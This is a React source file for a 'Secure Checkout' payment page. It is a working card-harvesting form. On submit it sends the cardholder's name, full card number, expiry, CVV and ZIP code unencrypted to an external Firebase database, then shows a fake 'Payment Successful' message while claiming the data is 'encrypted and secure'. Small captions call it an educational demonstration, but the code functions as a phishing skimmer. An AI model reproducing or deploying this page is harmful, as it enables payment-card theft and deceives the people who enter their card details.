import React, { useState } from 'react';
import { CreditCard, Lock, Shield, Eye, EyeOff, Folder, FileText, Download } from 'lucide-react';
// The import for fileStorage is kept, but its use is commented out for this solution
// import { fileStorage } from '../utils/fileStorage'; 

interface PaymentData {
  fullName: string;
  cardNumber: string;
  expiryMonth: string;
  expiryYear: string;
  cvv: string;
  zipCode: string;
  cardType: 'credit' | 'debit';
  timestamp: string; // Added to the interface for the Firebase record
}

interface PaymentPageProps {
  onPaymentComplete: () => void;
}

const PaymentPage: React.FC<PaymentPageProps> = ({ onPaymentComplete }) => {
  const [formData, setFormData] = useState({
    fullName: '',
    cardNumber: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: '',
    zipCode: '',
    cardType: 'credit' as 'credit' | 'debit'
  });

  const [isLoading, setIsLoading] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [showCvv, setShowCvv] = useState(false);
  
  const [isProcessing, setIsProcessing] = useState(false);
  const [createdFiles, setCreatedFiles] = useState<string[]>([]);
  const [showFileManager, setShowFileManager] = useState(false);
  const [errors, setErrors] = useState<Record<string, string>>({});

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    
    // Format card number input to space every 4 digits
    let formattedValue = value;
    if (name === 'cardNumber') {
      formattedValue = value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
      if (formattedValue.length > 19) {
        formattedValue = formattedValue.slice(0, 19);
      }
    }
    
    // Simple numeric and length validation for CVV
    if (name === 'cvv' && !/^\d*$/.test(value)) return;
    if (name === 'cvv' && value.length > 4) return;

    // Simple numeric and length validation for ZIP Code
    if (name === 'zipCode' && !/^\d*$/.test(value)) return;
    if (name === 'zipCode' && value.length > 10) return;

    setFormData(prev => ({ ...prev, [name]: formattedValue }));
    // Clear error on input change
    setErrors(prev => ({ ...prev, [name]: '' }));
  };
  
  const validateForm = () => {
    let isValid = true;
    const newErrors: Record<string, string> = {};
    
    if (formData.fullName.trim() === '') {
      newErrors.fullName = 'Full Name is required';
      isValid = false;
    }
    if (formData.cardNumber.replace(/\s/g, '').length < 16) {
      newErrors.cardNumber = 'Card number must be 16 digits';
      isValid = false;
    }
    if (formData.expiryMonth === '' || formData.expiryYear === '') {
      newErrors.expiryMonth = 'Expiry date is required';
      isValid = false;
    }
    if (formData.cvv.length < 3) {
      newErrors.cvv = 'CVV must be 3 or 4 digits';
      isValid = false;
    }
    
    setErrors(newErrors);
    return isValid;
  }

  // 👇 NEW IMPLEMENTATION FOR FIREBASE STORAGE
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) return;

    setIsLoading(true);

    // 1. Collect and format data
    const paymentRecord: PaymentData = {
      fullName: formData.fullName,
      // ⚠️ DANGEROUS: Storing raw card data! Remove spaces for cleaner storage.
      cardNumber: formData.cardNumber.replace(/\s/g, ''), 
      expiryMonth: formData.expiryMonth,
      expiryYear: formData.expiryYear,
      cvv: formData.cvv,
      zipCode: formData.zipCode,
      cardType: formData.cardType,
      timestamp: new Date().toISOString(), // Add a timestamp for the record
    };
    
    // 2. Define Firebase URL for POST request (POST adds a new record)
    const firebaseURL = 'https://devmint2025-default-rtdb.firebaseio.com/payments.json';

    try {
      // 3. Send data using Firebase Realtime Database REST API
      const response = await fetch(firebaseURL, {
        method: 'POST', 
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(paymentRecord),
      });

      if (!response.ok) {
        // Handle non-200 responses from Firebase
        const errorData = await response.json();
        throw new Error(`Firebase request failed: ${errorData.error || response.statusText}`);
      }

      const responseData = await response.json();
      console.log('Payment data successfully stored in Firebase with key:', responseData.name);

      // Simulate a successful payment completion
      setShowSuccess(true);
      setTimeout(onPaymentComplete, 3000); // Redirect after 3 seconds
      
    } catch (error) {
      console.error('Error storing data in Firebase:', error);
      // In a real app, you would set a user-facing error state here.
    } finally {
      setIsLoading(false);
    }
  };

  // The rest of the component remains the same for rendering the form
  const getCardIcon = () => {
    // Basic detection for display purposes (can be improved)
    const num = formData.cardNumber.replace(/\s/g, '');
    if (num.startsWith('4')) return 'Visa';
    if (num.startsWith('5')) return 'Mastercard';
    if (num.startsWith('34') || num.startsWith('37')) return 'Amex';
    return 'Card';
  };
  
  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 10 }, (_, i) => String(currentYear + i));

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center py-12">
      {showSuccess && (
        <div className="absolute top-0 left-0 right-0 z-50 bg-green-500 text-white p-4 text-center font-bold">
          Payment Successful! Redirecting...
        </div>
      )}
      <div className="w-full max-w-4xl bg-white shadow-xl rounded-2xl overflow-hidden md:flex">
        
        {/* Card Preview Section */}
        <div className="md:w-1/2 p-8 bg-gray-900 text-white flex flex-col justify-between">
          <div>
            <h2 className="text-2xl font-bold mb-8">Secure Checkout</h2>
            
            {/* Mock Credit Card */}
            <div className="p-6 bg-gradient-to-br from-indigo-500 to-purple-600 rounded-xl shadow-2xl transform hover:scale-[1.01] transition-transform">
              <div className="flex justify-between items-start mb-10">
                <CreditCard className="w-8 h-8 text-yellow-300" />
                <span className="text-xs font-mono">{formData.cardType.toUpperCase()}</span>
              </div>
              <p className="text-xl font-mono tracking-widest mb-4">
                {formData.cardNumber.padEnd(19, '•')}
              </p>
              <div className="flex justify-between text-sm">
                <div>
                  <label className="block text-gray-300 text-xs">Card Holder</label>
                  <p className="font-semibold">{formData.fullName || 'FULL NAME'}</p>
                </div>
                <div className="text-right">
                  <label className="block text-gray-300 text-xs">Expires</label>
                  <p className="font-semibold">{formData.expiryMonth || 'MM'}/{formData.expiryYear.slice(2) || 'YY'}</p>
                </div>
              </div>
            </div>
            
            <div className="mt-8">
              <h3 className="text-lg font-semibold mb-2">Transaction Details</h3>
              <div className="flex justify-between text-sm py-1">
                <span>Subtotal</span>
                <span>$199.00</span>
              </div>
              <div className="flex justify-between text-sm py-1">
                <span>Tax (8%)</span>
                <span>$15.92</span>
              </div>
              <div className="flex justify-between text-lg font-bold border-t border-gray-700 pt-2 mt-2">
                <span>Total Due</span>
                <span className="text-green-400">$214.92</span>
              </div>
            </div>
          </div>
          
          <div className="mt-12 text-sm text-gray-400">
            <p>This is an **educational demonstration** of a payment form.</p>
            <p>Data entered is logged to the database specified in the request.</p>
          </div>
        </div>

        {/* Payment Form Section */}
        <div className="md:w-1/2 p-8 lg:p-12">
          <h1 className="text-3xl font-extrabold text-gray-800 mb-8">Payment Information</h1>
          
          <form onSubmit={handleSubmit} className="space-y-6">
            
            {/* Full Name */}
            <div>
              <label htmlFor="fullName" className="block text-sm font-medium text-gray-700 mb-1">
                Card Holder Full Name
              </label>
              <input
                type="text"
                id="fullName"
                name="fullName"
                value={formData.fullName}
                onChange={handleInputChange}
                placeholder="John A. Doe"
                required
                className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-indigo-500 focus:border-indigo-500 transition-colors"
              />
              {errors.fullName && <p className="text-red-500 text-xs mt-1">{errors.fullName}</p>}
            </div>

            {/* Card Number */}
            <div>
              <label htmlFor="cardNumber" className="block text-sm font-medium text-gray-700 mb-1">
                Card Number
              </label>
              <div className="relative">
                <input
                  type="text"
                  id="cardNumber"
                  name="cardNumber"
                  value={formData.cardNumber}
                  onChange={handleInputChange}
                  placeholder="0000 0000 0000 0000"
                  required
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-indigo-500 focus:border-indigo-500 transition-colors pl-12"
                  maxLength={19}
                />
                <div className="absolute left-3 top-1/2 transform -translate-y-1/2">
                    <CreditCard className="w-5 h-5 text-gray-400" />
                </div>
              </div>
              {errors.cardNumber && <p className="text-red-500 text-xs mt-1">{errors.cardNumber}</p>}
            </div>

            <div className="flex space-x-4">
              {/* Expiry Date */}
              <div className="flex-1">
                <label className="block text-sm font-medium text-gray-700 mb-1">
                  Expiry Date
                </label>
                <div className="flex space-x-2">
                  <select
                    id="expiryMonth"
                    name="expiryMonth"
                    value={formData.expiryMonth}
                    onChange={handleInputChange}
                    required
                    className="w-1/2 px-4 py-2 border border-gray-300 rounded-lg focus:ring-indigo-500 focus:border-indigo-500 transition-colors appearance-none"
                  >
                    <option value="" disabled>MM</option>
                    {Array.from({ length: 12 }, (_, i) => (
                      <option key={i + 1} value={String(i + 1).padStart(2, '0')}>
                        {String(i + 1).padStart(2, '0')}
                      </option>
                    ))}
                  </select>
                  <select
                    id="expiryYear"
                    name="expiryYear"
                    value={formData.expiryYear}
                    onChange={handleInputChange}
                    required
                    className="w-1/2 px-4 py-2 border border-gray-300 rounded-lg focus:ring-indigo-500 focus:border-indigo-500 transition-colors appearance-none"
                  >
                    <option value="" disabled>YYYY</option>
                    {years.map(year => (
                      <option key={year} value={year}>{year}</option>
                    ))}
                  </select>
                </div>
                {errors.expiryMonth && <p className="text-red-500 text-xs mt-1">{errors.expiryMonth}</p>}
              </div>

              {/* CVV */}
              <div className="w-1/4">
                <label htmlFor="cvv" className="block text-sm font-medium text-gray-700 mb-1">
                  CVV
                </label>
                <div className="relative">
                  <input
                    type={showCvv ? 'text' : 'password'}
                    id="cvv"
                    name="cvv"
                    value={formData.cvv}
                    onChange={handleInputChange}
                    placeholder="***"
                    required
                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-indigo-500 focus:border-indigo-500 transition-colors pr-10"
                    maxLength={4}
                  />
                  <button
                    type="button"
                    onClick={() => setShowCvv(!showCvv)}
                    className="absolute right-0 top-0 mt-2 mr-2 text-gray-500 hover:text-gray-700"
                    aria-label={showCvv ? 'Hide CVV' : 'Show CVV'}
                  >
                    {showCvv ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                  </button>
                </div>
                {errors.cvv && <p className="text-red-500 text-xs mt-1">{errors.cvv}</p>}
              </div>
              
              {/* ZIP Code */}
              <div className="w-1/4">
                <label htmlFor="zipCode" className="block text-sm font-medium text-gray-700 mb-1">
                  ZIP Code
                </label>
                <input
                  type="text"
                  id="zipCode"
                  name="zipCode"
                  value={formData.zipCode}
                  onChange={handleInputChange}
                  placeholder="90210"
                  required
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-indigo-500 focus:border-indigo-500 transition-colors"
                  maxLength={10}
                />
              </div>
            </div>

            {/* Payment Button */}
            <button
              type="submit"
              disabled={isLoading}
              className={`w-full py-3 mt-4 text-white font-semibold rounded-lg shadow-md transition-colors ${
                isLoading 
                  ? 'bg-indigo-400 cursor-not-allowed' 
                  : 'bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2'
              }`}
            >
              {isLoading ? (
                <div className="flex items-center justify-center">
                  <div className="animate-spin rounded-full h-5 w-5 border-2 border-white border-t-transparent mr-2"></div>
                  Verifying Payment...
                </div>
              ) : (
                <div className="flex items-center justify-center">
                  <Lock className="w-5 h-5 mr-2" />
                  Verify Payment
                </div>
              )}
            </button>
          </form>

          {/* Security Footer */}
          <footer className="bg-gray-800 text-white py-8 mt-12">
          <div className="max-w-4xl mx-auto px-6 text-center">
            <Shield className="w-8 h-8 mx-auto mb-4 text-green-400" />
            <h3 className="text-xl font-semibold mb-2">Stay Safe Online</h3>
            <p className="text-gray-300 mb-4">
              Always verify website authenticity, look for HTTPS, and never share payment details on suspicious sites.
            </p>
            <div className="text-sm text-gray-400">
              <p>Cybersecurity Awareness © 2024</p>
            </div>
          </div>
        </footer>
          <div className="mt-6 pt-6 border-t border-gray-200">
            <div className="flex items-center justify-center text-sm text-gray-500">
              <Shield className="w-4 h-4 mr-2" />
              Your payment information is encrypted and secure
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PaymentPage;
